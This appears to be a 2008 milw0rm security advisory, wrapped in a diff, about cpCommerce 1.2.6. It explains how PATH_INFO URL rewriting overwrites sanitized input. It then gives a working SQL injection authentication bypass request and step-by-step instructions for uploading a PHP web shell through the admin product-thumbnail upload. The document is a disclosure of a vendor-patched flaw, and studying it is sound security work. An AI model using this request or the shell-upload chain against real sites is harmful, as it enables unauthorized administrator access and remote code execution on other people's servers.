@@ -1,0 +1,181 @@
+ Author:	girex
+ Homepage:	girex.altervista.org
+
+ CMS:		cpCommerce 1.2.6
+ Site:		http://cpcommerce.cpradio.org/
+
+ Bug: 		URL Rewrite -> Input variables overwrite
+ PoC:		Auth bypass -> Shell upload
+
+ Note:		Works regardless php.ini settings
+
+ Vendor informed:		23/11/08
+ cpCommerce 1.2.7 released: 	30/11/08 
+ Public advisory:		30/11/08
+
+-------------------------------------------------------------------------------------------------
+
+ CMS Description: cpCommerce is an open-source e-commerce solution that is maintained by templates and modules.
+
+-------------------------------------------------------------------------------------------------
+
+ Vulnerability discussion:
+ cpCommerce sets register_globals to Off with ini_set
+ and stores all GET and POST variables into $input array after have addslashed them.
+
+ lines: 16-32
+ file: /functions/sanitize_value.func.php 
+
+      function SanitizeInput()
+      {
+        $input = array();
+        if (isset($_GET) && sizeof($_GET) > 0 && is_array($_GET))
+        {
+          foreach ($_GET as $key => $val)
+          {
+            if (is_array($val))
+            {
+              $input[$key] = SanitizeArray($val);
+            }
+            else
+            {
+              $input[$key] = SanitizeValue($val);
+            }
+          }
+        }
+
+  ... and does the same for POST vars
+  
+ lines: 3-13
+
+      function SanitizeValue($value)
+      {
+        if (!get_magic_quotes_gpc())
+        {
+          return addslashes(preg_replace("/(\.\.)/i", "", htmlentities($value, ENT_QUOTES)));
+        }
+        else
+        {
+          return preg_replace("/(\.\.)/i", "", htmlentities($value, ENT_QUOTES));
+        }
+      }
+
+-------------------------------------------------------------------------------------------------
+  
+ Let we see _funcions.php (the mainfile)
+
+ lines: 128-132
+ file: _functions.php
+
+      $input = array();
+      if ((isset($_GET) && sizeof($_GET) > 0) || (isset($_POST) && sizeof($_POST) > 0))
+      {
+         $input = SanitizeInput();
+      }
+
+
+ So, all GET and POST vars ar sanitized and stored into $input array.
+ Let we procede in _functions.php...
+
+-------------------------------------------------------------------------------------------------
+
+ lines 156-173
+ file: _functions.php
+ 
+      if (isset($_SERVER['PATH_INFO']) && strlen($_SERVER['PATH_INFO']) != 0)
+      {
+        $rewriteValues = array();
+        if (strrpos($_SERVER['PATH_INFO'], '/') == strlen($_SERVER['PATH_INFO']) - 1)
+        {
+          $rewriteValues = split('/', substr($_SERVER['PATH_INFO'], 1, strlen($_SERVER['PATH_INFO']) - 2));
+        }
+        else
+        {
+          $rewriteValues = split('/', substr($_SERVER['PATH_INFO'], 1, strlen($_SERVER['PATH_INFO']) - 1));
+        }
+     
+        for ($i = 0; $i < sizeof($rewriteValues); $i += 2)
+        {
+          $input[$rewriteValues[$i]] = $rewriteValues[$i + 1];
+        }
+      }
+
+
+ $_SERVER['PATH_INFO'] is a SERVER var that contains the request url after the request page
+
+ For example: GET http://localhost/index.php/helloword
+ /index.php is the page requested and $_SERVER['PATH_INFO'] contains /helloword
+
+ As you can see from previous snipplet of code we can set $input content with
+ GET index.php/key/value/
+
+ So we can overwrite all inputs data in this cms, bypassing SanitazeInput()
+ and the effect of magic_quotes 
+ 
+ How we'll exploit that....
+
+-------------------------------------------------------------------------------------------------
+ 
+ lines: 13-20
+ code: /actions/login.act.php
+
+      if (checkSession($input['email'], md5($input['password']))) {
+        $_SESSION['cpTemplate'] = $_SESSION['cpInfo']['template'];
+        $return['url'] = urldecode("{$input['returnurl']}");
+      } else {
+
+        $_SESSION['loginerror'] = TRUE;
+        $return['url'] = urldecode("{$input['returnurl']}");
+      }
+
+ If checkSession returns true we are logged in...
+
+ lines: 3-9
+ code: /functions/account_info.func.php
+
+      function checkSession($email,$pass) {
+        global $config, $db_chooser;
+
+         $sql['accounts'] = "select `id_account`, `level` from " . $db_chooser->Accounts() . " where " .
+                           "email='$email' and pass='$pass'";
+
+         $accounts = $db_chooser->sql_query($sql['accounts']);
+
+
+ We can manipulate this query having a SQL Injection with an auth bypass
+ logging in with admin priviledges...
+
+-------------------------------------------------------------------------------------------------
+
+ If we set $input['email'] to: ' OR id_account=1#  with the trick of PATH_INFO (index.php/email/value)
+ the resulting query will be:  select `id_account`, `level` from cpAccounts where email='' OR id_account=1
+
+-------------------------------------------------------------------------------------------------
+
+ PoC Auth Bypass:  
+
+ GET http://[host]/[path]/index.php/email/%27%20OR%20id_account=1%23/?action=login&submit=Login&returnurl=index.php
+
+-------------------------------------------------------------------------------------------------
+
+-------------------------------------------------------------------------------------------------
+
+ If you want to upload a shell:
+
+- Log in with the auth bypass PoC
+- Go to /[path]/admin/
+
+- Go to General Info -> Configuration
+- Add ,php in  What Image Extensions do you want to accept on Uploads?
+
+- Go to Product -> Create
+- Select a right category
+- Fill required fields
+- Upload your shell.php in Product Thumbnail Image
+- Save all
+
+ Your shell wil be at /[path]/images/products/thumbnails/[name_of_shell]_[product_id].php
+
+-------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2008-11-30]
